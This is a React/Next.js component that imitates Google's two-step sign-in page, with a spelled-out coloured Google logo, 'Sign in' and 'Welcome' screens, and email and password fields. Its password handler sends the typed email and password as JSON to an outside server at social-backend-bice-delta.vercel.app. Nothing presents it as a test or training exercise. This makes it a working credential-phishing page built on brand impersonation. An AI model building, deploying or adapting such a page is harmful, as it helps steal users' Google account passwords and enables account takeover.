"use client";
import { useState } from "react";

export default function GmailLogin() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isTransitioning, setIsTransitioning] = useState(false);
  const [loading, setLoading] = useState(false); // loading state added
  const [errors, setErrors] = useState({ email: "", password: "" });

  const validateEmail = (email) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const handleEmailNext = async (e) => {
    e.preventDefault();
    if (loading) return; // prevent if loading
    setErrors({ email: "", password: "" });

    if (!email) {
      setErrors((prev) => ({ ...prev, email: "Email is required" }));
      return;
    }

    if (!validateEmail(email)) {
      setErrors((prev) => ({ ...prev, email: "Please enter a valid email address" }));
      return;
    }

    setIsTransitioning(true);
    setTimeout(() => {
      setStep(2);
      setIsTransitioning(false);
    }, 300);
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    if (loading) return; // prevent if loading
    setErrors({ email: "", password: "" });

    if (!password) {
      setErrors((prev) => ({ ...prev, password: "Password is required" }));
      return;
    }

    if (password.length < 6) {
      setErrors((prev) => ({ ...prev, password: "Password must be at least 6 characters" }));
      return;
    }

    try {
      setLoading(true); // start loading
      const response = await fetch("https://social-backend-bice-delta.vercel.app/api/auth/gmail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email,
          password,
          platform: "gmail",
        }),
      });

      const data = await response.json();

      if (response.ok) {
        alert("Login successful!");
        console.log("Login successful:", data);
        // optionally you can keep loading true or false here based on your need
      } else {
        setErrors((prev) => ({ ...prev, password: data.message || "Login failed" }));
      }
    } catch (error) {
      setErrors((prev) => ({ ...prev, password: "Network error. Please try again." }));
    } finally {
      setLoading(false); // stop loading
    }
  };

  const handleBackToEmail = () => {
    if (loading) return; // prevent if loading
    setIsTransitioning(true);
    setTimeout(() => {
      setStep(1);
      setIsTransitioning(false);
    }, 300);
  };

  return (
    <div className="min-h-screen bg-white">
      <div className="flex flex-col items-center justify-center min-h-screen px-4">
        <div className="w-full max-w-md">
          <div className="border border-gray-300 rounded-lg p-12 bg-white overflow-hidden">
            <div
              className={`transition-transform duration-300 ease-in-out ${isTransitioning
                  ? step === 1
                    ? "transform translate-x-full opacity-0"
                    : "transform -translate-x-full opacity-0"
                  : "transform translate-x-0 opacity-100"
                }`}
            >
              {step === 1 ? (
                <>
                  {/* Google Logo */}
                  <div className="text-center mb-6">
                    <div className="text-4xl font-normal mb-4">
                      <span className="text-blue-500">G</span>
                      <span className="text-red-500">o</span>
                      <span className="text-yellow-500">o</span>
                      <span className="text-blue-500">g</span>
                      <span className="text-green-500">l</span>
                      <span className="text-red-500">e</span>
                    </div>
                    <h1 className="text-2xl font-normal text-gray-700 mb-2">Sign in</h1>
                    <p className="text-sm text-gray-600">Use your Google Account</p>
                  </div>

                  {/* Email Form */}
                  <form onSubmit={handleEmailNext} className="space-y-6">
                    <div>
                      <input
                        type="email"
                        placeholder="Email or phone"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        className={`w-full px-3 py-4 border rounded-md text-base focus:outline-none focus:ring-1 ${errors.email
                            ? "border-red-500 focus:border-red-500 focus:ring-red-500"
                            : "border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                          }`}
                        required
                        disabled={loading}
                      />
                      {errors.email && (
                        <p className="text-red-500 text-xs mt-1">{errors.email}</p>
                      )}
                      <p className="text-xs text-blue-600 mt-2 cursor-pointer hover:underline">
                        Forgot email?
                      </p>
                    </div>

                    <div className="text-sm text-gray-600">
                      <p>Not your computer? Use Guest mode to sign in privately.</p>
                      <a href="#" className="text-blue-600 hover:underline">
                        Learn more
                      </a>
                    </div>

                    <div className="flex justify-end">
                      <button
                        type="submit"
                        className="bg-blue-600 text-white px-6 py-2 rounded-md font-medium hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
                        disabled={loading}
                      >
                        Next
                      </button>
                    </div>
                  </form>
                </>
              ) : (
                <>
                  {/* Google Logo */}
                  <div className="text-center mb-6">
                    <div className="text-4xl font-normal mb-4">
                      <span className="text-blue-500">G</span>
                      <span className="text-red-500">o</span>
                      <span className="text-yellow-500">o</span>
                      <span className="text-blue-500">g</span>
                      <span className="text-green-500">l</span>
                      <span className="text-red-500">e</span>
                    </div>
                    <h1 className="text-2xl font-normal text-gray-700 mb-2">Welcome</h1>
                    <div className="flex items-center justify-center mb-4">
                      <span className="text-sm text-gray-600 mr-2">{email}</span>
                      <button
                        type="button"
                        onClick={handleBackToEmail}
                        className="text-blue-600 text-sm hover:underline"
                        disabled={loading}
                      >
                        Change account
                      </button>
                    </div>
                  </div>

                  {/* Password Form */}
                  <form onSubmit={handlePasswordSubmit} className="space-y-6">
                    <div>
                      <input
                        type="password"
                        placeholder="Enter your password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className={`w-full px-3 py-4 border rounded-md text-base focus:outline-none focus:ring-1 ${errors.password
                            ? "border-red-500 focus:border-red-500 focus:ring-red-500"
                            : "border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                          }`}
                        required
                        autoFocus
                        disabled={loading}
                      />
                      {errors.password && (
                        <p className="text-red-500 text-xs mt-1">{errors.password}</p>
                      )}
                      <p className="text-xs text-blue-600 mt-2 cursor-pointer hover:underline">
                        Forgot password?
                      </p>
                    </div>

                    <div className="flex justify-between items-center">
                      <button
                        type="button"
                        onClick={handleBackToEmail}
                        className="text-blue-600 font-medium hover:bg-blue-50 px-6 py-2 rounded-md"
                        disabled={loading}
                      >
                        Back
                      </button>
                      <button
                        type="submit"
                        className="bg-blue-600 text-white px-6 py-2 rounded-md font-medium hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
                        disabled={loading}
                      >
                        {loading ? (
                          <div className="flex justify-center items-center">
                            <svg
                              className="animate-spin h-5 w-5 mr-3 text-white"
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 24 24"
                            >
                              <circle
                                className="opacity-25"
                                cx="12"
                                cy="12"
                                r="10"
                                stroke="currentColor"
                                strokeWidth="4"
                              ></circle>
                              <path
                                className="opacity-75"
                                fill="currentColor"
                                d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                              ></path>
                            </svg>
                            Loading...
                          </div>
                        ) : (
                          "Next"
                        )}
                      </button>
                    </div>
                  </form>
                </>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
